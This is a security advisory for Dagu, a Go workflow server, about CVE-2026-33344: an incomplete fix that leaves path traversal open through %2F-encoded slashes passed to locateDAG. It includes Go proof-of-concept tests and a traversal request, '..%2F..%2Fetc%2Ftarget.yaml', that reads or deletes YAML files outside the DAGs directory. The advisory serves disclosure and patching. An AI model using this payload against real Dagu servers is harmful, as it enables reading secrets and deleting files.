# [H] Dagu has an incomplete fix for CVE-2026-27598: path traversal via %2F-encoded slashes in locateDAG

## Summary
Severity: High
Advisory: GHSA-ph8x-4jfv-v9v8
CVE: CVE-2026-33344
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-19
Source: https://github.com/advisories/GHSA-ph8x-4jfv-v9v8
Type: github-advisory

## Affected
- Go: `github.com/dagu-org/dagu` — affected >=1.30.4-0.20260221021317-e2ed589105d7 <1.30.4-0.20260319093346-7d07fda8f9de

## Details
The fix for CVE-2026-27598 (commit e2ed589, PR #1691) added `ValidateDAGName` to `CreateNewDAG` and rewrote `generateFilePath` to use `filepath.Base`. This patched the CREATE path. The remaining API endpoints - GET, DELETE, RENAME, EXECUTE - all pass the `{fileName}` URL path parameter to `locateDAG` without calling `ValidateDAGName`. `%2F`-encoded forward slashes in the `{fileName}` segment traverse outside the DAGs directory.

### Vulnerable code

`internal/persis/filedag/store.go`, lines 508-513:

```go
func (store *Storage) locateDAG(nameOrPath string) (string, error) {
    if strings.Contains(nameOrPath, string(filepath.Separator)) {
        foundPath, err := findDAGFile(nameOrPath)
        if err == nil {
            return foundPath, nil  // returns arbitrary resolved path
        }
    }
    // ...safe searchPaths branch follows
```

`findDAGFile` resolves the path with `filepath.Abs` and checks only that the file exists with a YAML extension. No containment check against `baseDir`.

Chi v5 routes using `r.URL.RawPath` when set. The pattern `/dags/{fileName}/spec` captures `..%2F..%2Fetc%2Ftarget.yaml` as a single path segment. The oapi-codegen runtime calls `url.PathUnescape`, producing `../../etc/target.yaml`. This decoded string reaches `locateDAG` with the `/` separator intact.

Go's `net/http.ServeMux` would normally redirect paths containing `..`, but dagu binds the chi mux directly to `&http.Server{Handler: r}` (server.go:833-834), so no path cleaning fires.

### Affected endpoints

The three confirmed impacts via `locateDAG`:

| Endpoint | Impact |
|----------|--------|
| `GET /dags/{fileName}/spec` | Arbitrary `.yaml`/`.yml` file read (`os.ReadFile`) |
| `DELETE /dags/{fileName}` | Arbitrary `.yaml`/`.yml` file delete (`os.Remove`) |
| `POST /dags/{fileName}/start` | Load arbitrary YAML, execute as workflow |

Same pattern affects all other `{fileName}` endpoints: `/dag-runs`, `/dag-runs/{id}`, `/rename`, `/start-sync`, `/enqueue`, and webhook handlers. `UpdateDAGSpec` is incidentally blocked by DAG name validation during YAML parsing - not a security check, just data integrity validation that happens to reject `/`.

### PoC

**Store-level** (dagu v2.0.2, Go 1.26, macOS; `locateDAG` unchanged through v2.3.0):

```go
func TestLocateDAGPathTraversal(t *testing.T) {
    baseDir, _ := os.MkdirTemp("", "bd")
    defer os.RemoveAll(baseDir)
    outsideDir, _ := os.MkdirTemp("", "od")
    defer os.RemoveAll(outsideDir)

    store := filedag.New(baseDir, filedag.WithSkipExamples(true))
    ctx := context.Background()
    store.Create(ctx, "legit", []byte("name: legit\nsteps:\n  - name: s\n    command: echo ok\n"))

    target := filepath.Join(outsideDir, "secret.yaml")
    os.WriteFile(target, []byte("password: hunter2\ndb_host: prod-db.internal\n"), 0644)

    rel, _ := filepath.Rel(baseDir, target)
    spec, _ := store.GetSpec(ctx, rel)
    fmt.Println(spec)
}
```

Output:

```
baseDir:    /tmp/bd1816472583
targetFile: /tmp/od3906487343/secret.yaml
traversal:  ../od3906487343/secret.yaml

=== GetSpec (arbitrary file read) ===
SUCCESS: read file outside baseDir
Content:
password: hunter2
db_host: prod-db.internal

=== Delete (arbitrary file delete) ===
SUCCESS: deleted /tmp/od3906487343/important.yaml
```

**HTTP-level** (chi v5.2.2):

```go
r := chi.NewRouter()
r.Get("/dags/{fileName}/spec", func(w http.ResponseWriter, r *http.Request) {
    raw := chi.URLParam(r, "fileName")
    decoded, _ := url.PathUnescape(raw)
    fmt.Fprintf(w, "raw=%s\ndecoded=%s\n", raw, decoded)
})

req := httptest.NewRequest("GET", "/dags/..%2F..%2Fetc%2Ftarget.yaml/spec", nil)
w := httptest.NewRecorder()
r.ServeHTTP(w, req)
```

Output:

```
path: /dags/..%2F..%2Fetc%2Fpasswd/spec
status: 200
raw=..%2F..%2Fetc%2Fpasswd
decoded=../../etc/passwd
```

Chi captures `..%2F..%2Fetc%2Fpasswd` as one path segment via `RawPath`, oapi-codegen decodes `%2F` to `/`. Confirmed with chi v5.2.2.

### Affected versions

- v2.0.0 through v2.3.0 (current latest, checked 2026-03-18).
- The `locateDAG` function with the `filepath.Separator` code path was introduced in commit 1557b14f (PR #1573) as part of the v2.0.0 rewrite.
- The CVE-2026-27598 fix (e2ed589) also landed in v2.0.0 - it patched `CreateNewDAG` but didn't address the new `locateDAG` code path that was introduced in the same release.

### Suggested fix

Add path containment to `locateDAG` rather than sprinkling `ValidateDAGName` across every handler. Reject names containing path separators for HTTP-facing callers. If the separator code path is needed for internal worker communication (PR #1573), split `locateDAG` into a validated public method (HTTP handlers) and an internal method (trusted callers only).

### Impact

An authenticated user (or any user if `auth.mode=none`) can read or delete any `.yaml`/`.yml` file on the server filesystem that the process can access. K8s secrets stored as YAML, app configs, other DAG files.

The execute endpoints also traverse via `locateDAG`, loading the target YAML as a DAG definition. If the file contains valid DAG syntax with shell commands, those commands execute as the dagu process user. I haven't verified this end-to-end since it requires a target file with DAG-compatible structure, but the code path is the same `locateDAG` call confirmed above.

Auth is enabled by default since PR #1688 (v2.0.0), but exploitable by any authenticated user regardless of role - the DAG read/delete paths don't enforce RBAC granularity. Pre-v2.0.0 deployments or those with `auth.mode=none` are exploitable without credentials.

## References
- https://github.com/dagu-org/dagu/security/advisories/GHSA-ph8x-4jfv-v9v8
- https://nvd.nist.gov/vuln/detail/CVE-2026-33344
- https://github.com/dagu-org/dagu/commit/7d07fda8f9de3ae73dfb081ccd0639f8059c56bb
- https://github.com/dagu-org/dagu
